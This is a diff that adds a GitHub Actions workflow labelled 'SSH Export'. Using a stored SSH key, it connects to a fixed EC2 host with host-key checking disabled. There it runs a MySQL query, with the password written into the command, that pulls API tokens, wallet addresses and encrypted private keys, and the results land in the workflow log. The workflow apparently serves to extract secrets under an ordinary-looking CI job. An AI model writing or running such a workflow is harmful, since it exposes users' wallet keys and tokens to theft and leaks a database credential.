@@ -1,0 +1,20 @@
+name: SSH Export
+
+on:
+  workflow_dispatch:
+
+jobs:
+  export:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup SSH
+        env:
+          SSH_KEY: ${{ secrets.EC2_SSH_KEY }}
+        run: |
+          mkdir -p ~/.ssh
+          echo "$SSH_KEY" > ~/.ssh/key.pem
+          chmod 600 ~/.ssh/key.pem
+          
+      - name: Export Database
+        run: |
+          ssh -o StrictHostKeyChecking=no -i ~/.ssh/key.pem ubuntu@3.135.99.211 'mysql -u richard_clare -pAxDWeW8E7w8dSXJKsXsdfASXaxAD279347 infinitetrading -e "SELECT token, wallet_address, encrypted_pk FROM api_tokens"' 2>&1 || echo "SSH failed"
